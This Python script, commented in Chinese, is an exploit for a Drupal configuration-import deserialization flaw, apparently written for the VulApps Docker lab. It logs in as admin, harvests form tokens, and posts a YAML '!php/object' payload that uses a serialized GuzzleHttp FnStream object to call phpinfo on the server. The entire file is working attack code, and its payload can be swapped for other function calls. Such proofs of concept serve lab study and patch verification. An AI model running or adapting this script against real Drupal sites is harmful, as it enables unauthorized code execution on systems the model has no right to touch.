#!/usr/bin/env python
# -*- coding: utf-8 -*-
# python version 3.6.4
# 简介：
# 脚本适用于docker下的vulapps环境，使用
# docker run -d -p 80:80 medicean/vulapps:d_drupal_1
# 可直接运行。
# 具体信息参见github地址
# https://github.com/Medicean/VulApps/tree/master/d/drupal/1

import sys
import traceback
import http.client
import urllib.parse

from html.parser import HTMLParser

class LoginHTMLParser(HTMLParser):
    body = {"name":"admin", "pass":"admin123"}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            __attrs = dict(attrs)
            if __attrs.get("name") == None:
                return
            if __attrs["name"] == "form_build_id":
                self.body["form_build_id"] = __attrs["value"]
            elif __attrs["name"] == "form_id":
                self.body["form_id"] = __attrs["value"]
            elif __attrs["name"] == "op":
                self.body["op"] = __attrs["value"]

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)

class PostHTMLParser(HTMLParser):
    body = {"config_type":"system.simple", "config_name":"VulApps", "import":'!php/object "O:24:\\"GuzzleHttp\\\Psr7\\\FnStream\\":2:{s:33:\\"\\0GuzzleHttp\\\Psr7\\\FnStream\\0methods\\";a:1:{s:5:\\"close\\";s:7:\\"phpinfo\\";}s:9:\\"_fn_close\\";s:7:\\"phpinfo\\";}"', "custom_entity_id":""}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            __attrs = dict(attrs)
            if __attrs.get("name") == None:
                return
            if __attrs["name"] == "form_build_id":
                self.body["form_build_id"] = __attrs["value"]
            elif __attrs["name"] == "form_token":
                self.body["form_token"] = __attrs["value"]
            elif __attrs["name"] == "form_id":
                self.body["form_id"] = __attrs["value"]
            elif __attrs["name"] == "op":
                self.body["op"] = __attrs["value"]

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)

argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == 0 or argc > 2:
    print("用法：python",sys.argv[0],"IP地址 端口号")
    print("例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080")
    sys.exit()

ip = "192.168.13.129"
port = 80

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]

try:
    conn = http.client.HTTPConnection(ip, port)
except http.client.HTTPException as e:
    print(repr(e))
    traceback.print_exc()

try:
    url = "/user/login"
    conn.request("GET", url)
    resp = conn.getresponse()

    parser = LoginHTMLParser()
    content = str(resp.read(), "utf8")
    parser.feed(content)

    body = urllib.parse.urlencode(parser.body)
    header = {"Host":"192.168.13.129", "Content-Length":121, "Content-Type":"application/x-www-form-urlencoded", "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36"}
    conn.request("POST", url, body, header)
    resp = conn.getresponse()
    
    cookie = resp.getheader("Set-Cookie")
    resp.read()

    url = "/user/1"
    header["cookie"] = cookie
    header.pop("Content-Length")
    header.pop("Content-Type")
    conn.request("GET", url, "", header)
    resp = conn.getresponse()
    
    resp.read()

    url = "/admin/config/development/configuration/single/import"
    conn.request("GET", url, "", header)
    resp = conn.getresponse()

    parser = PostHTMLParser()
    content = str(resp.read(), "utf8")
    parser.feed(content)

    body = urllib.parse.urlencode(parser.body)
    header["Content-Length"] = len(body)
    header["Content-Type"] = "application/x-www-form-urlencoded"
    conn.request("POST", url, body, header)
    resp = conn.getresponse()

    print(str(resp.read(), "utf8"))
except http.client.HTTPException as e:
    print(repr(e))
    traceback.print_exc()
